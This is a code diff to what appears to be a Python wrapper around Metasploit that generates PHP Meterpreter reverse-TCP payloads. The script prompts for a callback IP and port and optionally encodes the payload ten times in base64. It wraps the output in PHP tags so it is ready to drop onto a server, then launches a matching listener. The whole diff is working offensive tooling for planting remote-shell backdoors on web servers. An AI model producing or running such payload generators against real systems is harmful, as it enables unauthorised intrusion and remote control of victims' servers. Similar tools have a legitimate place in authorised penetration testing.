@@ -1,7 +1,7 @@
 #!/usr/bin/python
 #
 import os
-import subprocess
+import subprocess as subp
 from src import menus
 from src.main import *
 from time import sleep
@@ -28,24 +28,37 @@ while 1:
 				payload = "php/meterpreter/reverse_tcp"
 				break
 		
-		# get some user info
+		# get some payload info
 		ip = raw_input("\nEnter your local or remote ip (%s): " % iface)
-		if ip == '':
+		if not ip:
 			ip = iface
 		port = raw_input("Enter a port (default 8080): ")
-		if port == '':
+		if not port:
 			port = 8080
 		filename = raw_input("Enter a name for php file: ")
+		if not filename:
+			filename = "paygen-pl.php"
+		else:
+			filename += ".php"
 		
 		# create payload
 		if selection == '1' or selection == '2':
 			PrintInfo("Creating payload please wait...")
-			subprocess.Popen("%s/msfpayload %s lhost=%s lport=%s R > output/%s.php" % (msfpath(), payload, ip, port, filename), shell=True).wait()
-			PrintError("Remember to edit the payload and remove the initial # from the the php tag")
+			proc = subp.Popen("%s/msfpayload %s lhost=%s lport=%s R" % (msfpath(), payload, ip, port), shell=True, stdout=subp.PIPE)
+			code = proc.communicate()[0]
+			finalpl = "<?php\n\n" + code + "\n\n?>"
+			f = open("output/"+filename, "w")
+			f.write(finalpl)
+			f.close()
+			
 		elif selection == '3' or selection =='':
 			PrintInfo("Creating payload with x10 base64. Please wait...")
-			subprocess.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e php/base64 -i 10 -f raw > output/%s.php" % (msfpath(), payload, ip, port, filename), shell=True).wait()
-			PrintError("Remember to add php tags to the payload (<?php ?>)")
+			proc = subp.Popen("%s/msfvenom -p %s lhost=%s lport=%s -e php/base64 -i 10 -f raw" % (msfpath(), payload, ip, port), stdout=subp.PIPE, shell=True)
+			code = proc.communicate()[0]
+			finalpl = "<?php\n\n" + code + "\n\n?>"
+			f = open("output/"+filename, "w")
+			f.write(finalpl)
+			f.close()
 	
 		# start multi handler
 		answer = raw_input("\nStart matching handler Y/N? (Default Y) ")
@@ -68,7 +81,7 @@ while 1:
 			fw.close()
 	
 			# start listener
-			subprocess.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
+			subp.Popen("%s/msfconsole -r %s" % (msfpath(), rcfile), shell=True).wait()
 	
 			PrintInfo("Cleaning up...")
 			os.remove(rcfile)
@@ -77,11 +90,8 @@ while 1:
 			# return to main
 			break
 	
-		else:
-			Notify("Payload created in the output directory", "2")
-			
-			# return to main
-			EntContinue()
-			break
+		# return to main
+		EntContinue()
+		break
 	except KeyboardInterrupt:
 		break
